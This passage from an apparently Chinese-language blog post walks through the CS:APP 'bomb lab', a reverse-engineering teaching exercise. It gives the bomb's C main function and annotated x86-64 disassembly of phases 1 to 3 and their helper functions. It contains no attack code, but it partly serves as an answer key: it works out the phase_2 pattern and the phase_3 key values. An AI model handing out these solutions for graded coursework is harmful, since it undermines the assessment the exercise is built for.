class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读入数据 */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: Error: Couldn't open %s\n"</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s [&lt;input_file&gt;]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 开始炸弹 */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"which to blow yourself up. Have a nice day!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb1 */</span></span><br><span class="line">    input = read_line();          </span><br><span class="line">    phase_1(input);               </span><br><span class="line">    phase_defused();                 </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Phase 1 defused. How about the next one?\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb2 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"That's number 2.  Keep going!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb3 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Halfway there!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb4 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"So you got that one.  Try this one.\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Bomb5 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good work!  On to the next...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bomb6 */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 结束 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h3><ul><li>输入: 一个字符指针 input</li><li>功能: input 指向对象与 地址<code>$0x402400</code>指向对象相同,不同炸</li><li>调用: strings_not_equal();  </li><li>返回: 0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">&#x2F;&#x2F;rdi &#x3D; *input</span><br><span class="line">    0x0000000000400ee0 &lt;+0&gt;:sub    $0x8,%rsp        &#x2F;&#x2F;栈下调8位</span><br><span class="line">    0x0000000000400ee4 &lt;+4&gt;:mov    $0x402400,%esi   &#x2F;&#x2F;$0x402400 放入%esi(参数2)</span><br><span class="line">    0x0000000000400ee9 &lt;+9&gt;:callq  0x401338 &lt;strings_not_equal&gt; &#x2F;&#x2F;调用strings_not_equal</span><br><span class="line">    0x0000000000400eee &lt;+14&gt;:test   %eax,%eax       &#x2F;&#x2F;检测参1参2是否相同</span><br><span class="line">    0x0000000000400ef0 &lt;+16&gt;:je     0x400ef7 &lt;phase_1+23&gt;    &#x2F;&#x2F;0相同 转+23</span><br><span class="line">    0x0000000000400ef2 &lt;+18&gt;:callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;1不同,炸</span><br><span class="line">    0x0000000000400ef7 &lt;+23&gt;:add    $0x8,%rsp    &#x2F;&#x2F;出栈</span><br><span class="line">    0x0000000000400efb &lt;+27&gt;:retq</span><br></pre></td></tr></table></figure><h3 id="strings-not-equal"><a href="#strings-not-equal" class="headerlink" title="strings_not_equal"></a>strings_not_equal</h3><ul><li>输入: 参数12 均为字符地址</li><li>功能: 比较两个指向对象长度与内容是否相同</li><li>调用: string_length()</li><li>返回: 相同返回0, 不同返回1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function strings_not_equal:</span><br><span class="line">&#x2F;* rdi &#x3D; *input; esi &#x3D; $0x402400</span><br><span class="line">    0x0000000000401338 &lt;+0&gt;:push   %r12</span><br><span class="line">    0x000000000040133a &lt;+2&gt;:push   %rbp</span><br><span class="line">    0x000000000040133b &lt;+3&gt;:push   %rbx     &#x2F;&#x2F;以上保存环境</span><br><span class="line">    0x000000000040133c &lt;+4&gt;:mov    %rdi,%rbx    &#x2F;&#x2F;rbx &#x3D; *input</span><br><span class="line">    0x000000000040133f &lt;+7&gt;:mov    %rsi,%rbp    &#x2F;&#x2F;rbp &#x3D; $0x402400(地址)</span><br><span class="line">    0x0000000000401342 &lt;+10&gt;:callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;调用string_length, 参数不变</span><br><span class="line">    0x0000000000401347 &lt;+15&gt;:mov    %eax,%r12d   &#x2F;&#x2F;r12d(双字)保存字符串长度</span><br><span class="line">    0x000000000040134a &lt;+18&gt;:mov    %rbp,%rdi    &#x2F;&#x2F;计算($0x402400)的长度</span><br><span class="line">    0x000000000040134d &lt;+21&gt;:callq  0x40131b &lt;string_length&gt; &#x2F;&#x2F;($0x402400)长度保存在rax</span><br><span class="line">    0x0000000000401352 &lt;+26&gt;:mov    $0x1,%edx    &#x2F;&#x2F;edx &#x3D; 1</span><br><span class="line">    0x0000000000401357 &lt;+31&gt;:cmp    %eax,%r12d   &#x2F;&#x2F;字符串与常数长度比较</span><br><span class="line">    0x000000000040135a &lt;+34&gt;:jne    0x40139b &lt;strings_not_equal+99&gt;  &#x2F;&#x2F;长度不同转99</span><br><span class="line">    0x000000000040135c &lt;+36&gt;:movzbl (%rbx),%eax  &#x2F;&#x2F;串1 -&gt; rax</span><br><span class="line">    0x000000000040135f &lt;+39&gt;:test   %al,%al</span><br><span class="line">    0x0000000000401361 &lt;+41&gt;:je     0x401388 &lt;strings_not_equal+80&gt;&#x2F;&#x2F;如果串1空,转80</span><br><span class="line">    0x0000000000401363 &lt;+43&gt;:cmp    0x0(%rbp),%al        &#x2F;&#x2F;比较串1串2</span><br><span class="line">    0x0000000000401366 &lt;+46&gt;:je     0x401372 &lt;strings_not_equal+58&gt;  &#x2F;&#x2F;相等,转58</span><br><span class="line">    0x0000000000401368 &lt;+48&gt;:jmp    0x40138f &lt;strings_not_equal+87&gt;  &#x2F;&#x2F;不等,转87</span><br><span class="line">    0x000000000040136a &lt;+50&gt;:cmp    0x0(%rbp),%al    &#x2F;&#x2F;比较(常数)与字符串</span><br><span class="line">    0x000000000040136d &lt;+53&gt;:nopl   (%rax)       &#x2F;&#x2F;好像是对齐用的? 无操作</span><br><span class="line">    0x0000000000401370 &lt;+56&gt;:jne    0x401396 &lt;strings_not_equal+94&gt;  &#x2F;&#x2F;不等转94</span><br><span class="line">    0x0000000000401372 &lt;+58&gt;:add    $0x1,%rbx    &#x2F;&#x2F;字符串指针++</span><br><span class="line">    0x0000000000401376 &lt;+62&gt;:add    $0x1,%rbp    &#x2F;&#x2F;常数地址指针++</span><br><span class="line">    0x000000000040137a &lt;+66&gt;:movzbl (%rbx),%eax  </span><br><span class="line">    0x000000000040137d &lt;+69&gt;:test   %al,%al      &#x2F;&#x2F;如果字符串不空</span><br><span class="line">    0x000000000040137f &lt;+71&gt;:jne    0x40136a &lt;strings_not_equal+50&gt; &#x2F;&#x2F;转+50</span><br><span class="line">    0x0000000000401381 &lt;+73&gt;:mov    $0x0,%edx&#x2F;&#x2F;如果串1空</span><br><span class="line">    0x0000000000401386 &lt;+78&gt;:jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x0000000000401388 &lt;+80&gt;:mov    $0x0,%edx&#x2F;&#x2F;上接41,串1空, 返回0</span><br><span class="line">    0x000000000040138d &lt;+85&gt;:jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x000000000040138f &lt;+87&gt;:mov    $0x1,%edx    &#x2F;&#x2F;上接48,串12不等,返回1</span><br><span class="line">    0x0000000000401394 &lt;+92&gt;:jmp    0x40139b &lt;strings_not_equal+99&gt;</span><br><span class="line">    0x0000000000401396 &lt;+94&gt;:mov    $0x1,%edx    &#x2F;&#x2F;上接94,串不等,返回1</span><br><span class="line">    0x000000000040139b &lt;+99&gt;:mov    %edx,%eax    &#x2F;&#x2F;上接34,长度不等,返回1</span><br><span class="line">    0x000000000040139d &lt;+101&gt;:pop    %rbx </span><br><span class="line">    0x000000000040139e &lt;+102&gt;:pop    %rbp</span><br><span class="line">    0x000000000040139f &lt;+103&gt;:pop    %r12 &#x2F;&#x2F;恢复环境</span><br><span class="line">    0x00000000004013a1 &lt;+105&gt;:retq</span><br></pre></td></tr></table></figure><p>注:</p><ol><li><p>开头结尾有保存环境的push与pop操作</p></li><li><p>r12d 指12寄存器的双字部分, 依次是:r12, r12d, r12w, r12b. d疑似指double word</p></li><li><p>nopl 为无操作, 可参考<a href="https://exp.newsmth.net/topic/article/9a37ce02c405b2b7ae9558f161f38c38" target="_blank" rel="noopener">这里</a>.</p></li><li><p>过程:</p><ol><li>先比较两串的长度,若不同直接返回1(+34); </li><li>然后一个一个bit地比较, 每次比较完跳转回+50, 直到全部比较结束, 串为空,返回0</li><li>当比较中遇到串不等, 立刻退出,返回1</li></ol></li><li><p>疑惑:</p><ol><li><p>为什么每次指针仅仅是自加? 每次是对al比较(1byte), 指针+4岂不美哉?</p></li><li><p>87,94,99都是出错, 返回1, 为什么不合并成1个? </p><p>(猜测:可能是优化级别不够, 照顾我们的智力水平😂)</p></li></ol></li></ol><h3 id="string-length"><a href="#string-length" class="headerlink" title="string_length"></a>string_length</h3><ul><li>输入: 字符指针</li><li>功能: 返回指向的串的长度, 空返回0</li><li>无调用</li><li>返回: 返回指向的串的长度, 空返回0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rdi &#x3D; *input; </span><br><span class="line">Dump of assembler code for function string_length:</span><br><span class="line">    0x000000000040131b &lt;+0&gt;:cmpb   $0x0,(%rdi)      </span><br><span class="line">    0x000000000040131e &lt;+3&gt;:je     0x401332 &lt;string_length+23&gt;  &#x2F;&#x2F;如果input空, 转23(返回0)</span><br><span class="line">    0x0000000000401320 &lt;+5&gt;:mov    %rdi,%rdx        &#x2F;&#x2F;rdx &#x3D; *input</span><br><span class="line">    0x0000000000401323 &lt;+8&gt;:add    $0x1,%rdx        &#x2F;&#x2F;rdx ++ 每轮将指针+1 </span><br><span class="line">    0x0000000000401327 &lt;+12&gt;:mov    %edx,%eax    &#x2F;&#x2F;eax &#x3D;rdx</span><br><span class="line">    0x0000000000401329 &lt;+14&gt;:sub    %edi,%eax    &#x2F;&#x2F;eax -&#x3D; edi, 当前指针与原指针差值</span><br><span class="line">    0x000000000040132b &lt;+16&gt;:cmpb   $0x0,(%rdx)  &#x2F;&#x2F;指针指向与0比较</span><br><span class="line">    0x000000000040132e &lt;+19&gt;:jne    0x401323 &lt;string_length+8&gt;&#x2F;&#x2F;当指向非零, 表示还未结束 递归调用</span><br><span class="line">    0x0000000000401330 &lt;+21&gt;:repz retq   &#x2F;&#x2F;返还rax 即最后的差值, 为指针储存的数据的长度</span><br><span class="line">    0x0000000000401332 &lt;+23&gt;:mov    $0x0,%eax    &#x2F;&#x2F;(上接+3) 返回0</span><br><span class="line">    0x0000000000401337 &lt;+28&gt;:retq</span><br></pre></td></tr></table></figure><hr><h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h3><ul><li>输入: *input</li><li>功能: 与六个数字比较, 不同炸</li><li>调用: read_six_numbers</li><li>返回: 无</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">&#x2F;&#x2F;rdi *input</span><br><span class="line">    0x0000000000400efc &lt;+0&gt;:push   %rbp</span><br><span class="line">    0x0000000000400efd &lt;+1&gt;:push   %rbx&#x2F;&#x2F;保存环境</span><br><span class="line">    0x0000000000400efe &lt;+2&gt;:sub    $0x28,%rsp   &#x2F;&#x2F;栈分28位</span><br><span class="line">    0x0000000000400f02 &lt;+6&gt;:mov    %rsp,%rsi    &#x2F;&#x2F;栈指针作为第二个参数</span><br><span class="line">    0x0000000000400f05 &lt;+9&gt;:callq  0x40145c &lt;read_six_numbers&gt;&#x2F;&#x2F;读数在栈内</span><br><span class="line">    0x0000000000400f0a &lt;+14&gt;:cmpl   $0x1,(%rsp)  &#x2F;&#x2F;栈顶元素与1比较</span><br><span class="line">    0x0000000000400f0e &lt;+18&gt;:je     0x400f30 &lt;phase_2+52&gt;    &#x2F;&#x2F;不同炸, 相同转52</span><br><span class="line">    0x0000000000400f10 &lt;+20&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f15 &lt;+25&gt;:jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">    0x0000000000400f17 &lt;+27&gt;:mov    -0x4(%rbx),%eax      &#x2F;&#x2F;eax &#x3D; 栈元素前一个元素</span><br><span class="line">    0x0000000000400f1a &lt;+30&gt;:add    %eax,%eax            &#x2F;&#x2F;eax *&#x3D; 2</span><br><span class="line">    0x0000000000400f1c &lt;+32&gt;:cmp    %eax,(%rbx)              &#x2F;&#x2F;rbx(下一个元素)与eax(两倍的上一个元素)比较</span><br><span class="line">    0x0000000000400f1e &lt;+34&gt;:je     0x400f25 &lt;phase_2+41&gt;    &#x2F;&#x2F;不同炸,相同转41</span><br><span class="line">    0x0000000000400f20 &lt;+36&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f25 &lt;+41&gt;:add    $0x4,%rbx            &#x2F;&#x2F;rbx &#x3D; 栈下一个元素</span><br><span class="line">    0x0000000000400f29 &lt;+45&gt;:cmp    %rbp,%rbx            &#x2F;&#x2F;rbx 与 rbp比较</span><br><span class="line">    0x0000000000400f2c &lt;+48&gt;:jne    0x400f17 &lt;phase_2+27&gt;    &#x2F;&#x2F;不同转27,继续轮回</span><br><span class="line">    0x0000000000400f2e &lt;+50&gt;:jmp    0x400f3c &lt;phase_2+64&gt;&#x2F;&#x2F;相同,第六个元素 转64</span><br><span class="line">    0x0000000000400f30 &lt;+52&gt;:lea    0x4(%rsp),%rbx       &#x2F;&#x2F;rbx &#x3D; 下一个元素</span><br><span class="line">    0x0000000000400f35 &lt;+57&gt;:lea    0x18(%rsp),%rbp      &#x2F;&#x2F;rbp &#x3D; 栈顶+18(应该是第六个元素,存疑)</span><br><span class="line">    0x0000000000400f3a &lt;+62&gt;:jmp    0x400f17 &lt;phase_2+27&gt;   &#x2F;&#x2F;转27</span><br><span class="line">    0x0000000000400f3c &lt;+64&gt;:add    $0x28,%rsp           &#x2F;&#x2F;出栈28位</span><br><span class="line">    0x0000000000400f40 &lt;+68&gt;:pop    %rbx</span><br><span class="line">    0x0000000000400f41 &lt;+69&gt;:pop    %rbp             &#x2F;&#x2F;恢复环境</span><br><span class="line">    0x0000000000400f42 &lt;+70&gt;:retq                    &#x2F;&#x2F;结束</span><br></pre></td></tr></table></figure><p>注: </p><ol><li>read_six_numbers 函数内其实没看懂, 由名字猜测了一波</li><li>lea S D指令, 将S(一个有效地址) 复制给D, 后续引用(D)用法类似指针</li><li><code>add    $0x4,%rbx</code> 指针下一个元素, 注意栈是倒过来储存的</li><li>存疑:<ol><li>57 行, <code>%rbp</code>应该是被赋了第六个参数的值. 可是为什么是+18? 不应该是+ 20(4*5)吗?</li></ol></li></ol><h3 id="read-six-numbers"><a href="#read-six-numbers" class="headerlink" title="read_six_numbers"></a>read_six_numbers</h3><ul><li>输入: *input, 栈指针</li><li>功能: 读取6个数据写在内存中</li><li>调用: __isoc99_sscanf@plt (疑似库函数?)</li><li>返回: 无</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">    0x000000000040145c &lt;+0&gt;:sub    $0x18,%rsp       &#x2F;&#x2F;分配18</span><br><span class="line">    0x0000000000401460 &lt;+4&gt;:mov    %rsi,%rdx        &#x2F;&#x2F;rdx &#x3D; 原栈指针</span><br><span class="line">    0x0000000000401463 &lt;+7&gt;:lea    0x4(%rsi),%rcx   &#x2F;&#x2F;rcx &#x3D; (栈4)</span><br><span class="line">    0x0000000000401467 &lt;+11&gt;:lea    0x14(%rsi),%rax  &#x2F;&#x2F;rax &#x3D; (栈20)</span><br><span class="line">    0x000000000040146b &lt;+15&gt;:mov    %rax,0x8(%rsp)   &#x2F;&#x2F;(栈+8) &#x3D; 栈20</span><br><span class="line">    0x0000000000401470 &lt;+20&gt;:lea    0x10(%rsi),%rax  &#x2F;&#x2F;rax &#x3D; (栈+16)</span><br><span class="line">    0x0000000000401474 &lt;+24&gt;:mov    %rax,(%rsp)      &#x2F;&#x2F;(rsp) &#x3D; rax &#x3D; (原栈+16)</span><br><span class="line">    0x0000000000401478 &lt;+28&gt;:lea    0xc(%rsi),%r9    &#x2F;&#x2F;r9 &#x3D; (rsi+12)</span><br><span class="line">    0x000000000040147c &lt;+32&gt;:lea    0x8(%rsi),%r8    &#x2F;&#x2F;r8 &#x3D; (rsi+8)</span><br><span class="line">    0x0000000000401480 &lt;+36&gt;:mov    $0x4025c3,%esi   &#x2F;&#x2F;si &#x3D; $0x4025c3</span><br><span class="line">    0x0000000000401485 &lt;+41&gt;:mov    $0x0,%eax        &#x2F;&#x2F;ax &#x3D; 0</span><br><span class="line">    0x000000000040148a &lt;+46&gt;:callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">    0x000000000040148f &lt;+51&gt;:cmp    $0x5,%eax        &#x2F;&#x2F;结果与5比较</span><br><span class="line">    0x0000000000401492 &lt;+54&gt;:jg     0x401499 &lt;read_six_numbers+61&gt;&#x2F;&#x2F;结果&gt;5 不炸</span><br><span class="line">    0x0000000000401494 &lt;+56&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000401499 &lt;+61&gt;:add    $0x18,%rsp       &#x2F;&#x2F;收回18</span><br><span class="line">    0x000000000040149d &lt;+65&gt;:retq</span><br></pre></td></tr></table></figure><p>嗯…虽然我没懂他每一步在干什么, 不妨碍我猜出他是用来干啥的.</p><h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h3><ul><li>输入: *input</li><li>功能: 与两个数字比较, 不同炸</li><li>调用: __isoc99_sscanf</li><li>返回: 无</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">rdi &#x3D; &amp;input</span><br><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">    0x0000000000400f43 &lt;+0&gt;:    sub    $0x18,%rsp               &#x2F;&#x2F;栈扩18</span><br><span class="line">    0x0000000000400f47 &lt;+4&gt;:    lea    0xc(%rsp),%rcx           &#x2F;&#x2F;rcx &#x3D; &amp;(栈12)</span><br><span class="line">    0x0000000000400f4c &lt;+9&gt;:    lea    0x8(%rsp),%rdx           &#x2F;&#x2F;rdx &#x3D; &amp;(栈8)</span><br><span class="line">    0x0000000000400f51 &lt;+14&gt;:mov    $0x4025cf,%esi           &#x2F;&#x2F;si &#x3D; $0x4025cf</span><br><span class="line">    0x0000000000400f56 &lt;+19&gt;:mov    $0x0,%eax                &#x2F;&#x2F;ax &#x3D; $0x0</span><br><span class="line">    0x0000000000400f5b &lt;+24&gt;:callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;   &#x2F;&#x2F; 见注解p3_1,将2个数字装入栈8 和 栈12处</span><br><span class="line">    0x0000000000400f60 &lt;+29&gt;:cmp    $0x1,%eax                &#x2F;&#x2F;ax与1比较 </span><br><span class="line">    0x0000000000400f63 &lt;+32&gt;:jg     0x400f6a &lt;phase_3+39&gt;    &#x2F;&#x2F;ax&gt;1 跳转39 否则炸</span><br><span class="line">    0x0000000000400f65 &lt;+34&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f6a &lt;+39&gt;:cmpl   $0x7,0x8(%rsp)           &#x2F;&#x2F;*(栈8)与7比较 (也就是数字1与7比较)</span><br><span class="line">    0x0000000000400f6f &lt;+44&gt;:ja     0x400fad &lt;phase_3+106&gt;   &#x2F;&#x2F;*(栈8)&gt;7(无符号) 转106,炸</span><br><span class="line">    0x0000000000400f71 &lt;+46&gt;:mov    0x8(%rsp),%eax           &#x2F;&#x2F;ax &#x3D; *(栈8) 数1</span><br><span class="line">    0x0000000000400f75 &lt;+50&gt;:jmpq   *0x402470(,%rax,8)       &#x2F;&#x2F;跳转到(ax*8+0x402470) 见注解p3_2</span><br><span class="line">    0x0000000000400f7c &lt;+57&gt;:mov    $0xcf,%eax               &#x2F;&#x2F;上接50 且ax&#x3D;0 key &#x3D; 0xcf &#x3D; 207</span><br><span class="line">    0x0000000000400f81 &lt;+62&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f83 &lt;+64&gt;:mov    $0x2c3,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;2 key &#x3D; 0x2c3 &#x3D; 707</span><br><span class="line">    0x0000000000400f88 &lt;+69&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f8a &lt;+71&gt;:mov    $0x100,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;3 key &#x3D; 0x100 &#x3D; 256</span><br><span class="line">    0x0000000000400f8f &lt;+76&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f91 &lt;+78&gt;:mov    $0x185,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;4 key &#x3D; 0x185 &#x3D; 389</span><br><span class="line">    0x0000000000400f96 &lt;+83&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f98 &lt;+85&gt;:mov    $0xce,%eax               &#x2F;&#x2F;上接50 且ax&#x3D;5 key &#x3D; 0xce  &#x3D; 206</span><br><span class="line">    0x0000000000400f9d &lt;+90&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f9f &lt;+92&gt;:mov    $0x2aa,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;6 key &#x3D; 0x2aa &#x3D; 682</span><br><span class="line">    0x0000000000400fa4 &lt;+97&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fa6 &lt;+99&gt;:mov    $0x147,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;7 key &#x3D; 0x147 &#x3D; 327</span><br><span class="line">    0x0000000000400fab &lt;+104&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fad &lt;+106&gt;:callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;上接44,输入个数&lt;2</span><br><span class="line">    0x0000000000400fb2 &lt;+111&gt;:mov    $0x0,%eax                &#x2F;&#x2F;这里是什么情况?存疑</span><br><span class="line">    0x0000000000400fb7 &lt;+116&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fb9 &lt;+118&gt;:mov    $0x137,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;1 key &#x3D; 0x137 &#x3D; 311</span><br><span class="line">    0x0000000000400fbe &lt;+123&gt;:cmp    0xc(%rsp),%eax           &#x2F;&#x2F;比较ax(即key)与数2</span><br><span class="line">    0x0000000000400fc2 &lt;+127&gt;:je     0x400fc9 &lt;phase_3+134&gt;   &#x2F;&#x2F;不等炸</span><br><span class="line">    0x0000000000400fc4 &lt;+129&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400fc9 &lt;+134&gt;:add    $0x18,%rsp</span><br><span class="line">    0x0000000000400fcd &lt;+138&gt;:retq</span><br></pre></td></tr></table></figure><p>注: </p><ol><li><p>输入两个数字,分别储存在栈8与栈12处, 多余输入不计</p></li><li><p>如果输入1个,直接炸</p></li><li><p>数1(栈8) 若&gt;(unsigned )7, 直接炸</p></li><li><p>根据数1的不同取值(0~7), 跳转到栈种储存的不同地址, 并根据地址拿到key(存储到ax中)</p></li><li><p>数2(栈12) 与 key比较, 不同炸, 相同过</p></li><li><p>疑惑:</p><p>+111处是什么时候会运行到? 直接把ax赋0?</p></li></ol><h4 id="注解p3-1"><a href="#注解p3-1" class="headerlink" title="注解p3_1"></a>注解p3_1</h4><p><strong>__isoc99_sscanf()</strong></p><p>​    c99标准库sscanf函数, <a href="http://www.cplusplus.com/reference/cstdio/sscanf/" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>​    int sscanf ( const char <em> s, const char </em> format, …);</p><p>​    Read formatted data from string</p><p>​    Reads data from s and stores them according to parameter format into the locations given by the additional arguments, as if scanf was used, but reading from s instead of the standard input (stdin).</p><p>​    The additional arguments should point to already allocated objects of the type specified by their corresponding format specifier within the format string.</p><p>​    Return Value</p><p>​    On success, the function returns the number of items in the argument list successfully filled. This count can match the expected number of items or be less (even zero) in the case of a matching failure.</p><p>​    In the case of an input failure before any data could be successfully interpreted, EOF is returned. </p></blockquote><p>​    返回读取到的item的个数</p><h4 id="注解p3-2"><a href="#注解p3-2" class="headerlink" 